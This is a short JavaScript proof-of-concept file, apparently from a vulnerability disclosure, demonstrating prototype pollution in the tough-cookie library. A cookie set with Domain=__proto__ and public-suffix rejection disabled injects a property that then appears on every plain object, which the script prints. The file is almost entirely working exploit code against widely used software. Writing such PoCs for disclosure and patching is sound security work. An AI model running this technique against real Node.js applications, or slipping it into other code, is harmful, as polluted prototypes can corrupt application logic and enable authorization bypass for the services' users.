// PoC.js
async function main(){
var tough = require("tough-cookie");
var cookiejar = new tough.CookieJar(undefined,{rejectPublicSuffixes:false});
// Exploit cookie
await cookiejar.setCookie(
  "Slonser=polluted; Domain=__proto__; Path=/notauth",
  "https://__proto__/admin"
);
// normal cookie
var cookie = await cookiejar.setCookie(
  "Auth=Lol; Domain=google.com; Path=/notauth",
  "https://google.com/"
);

//Exploit cookie
var a = {};
console.log(a["/notauth"]["Slonser"])
}
main();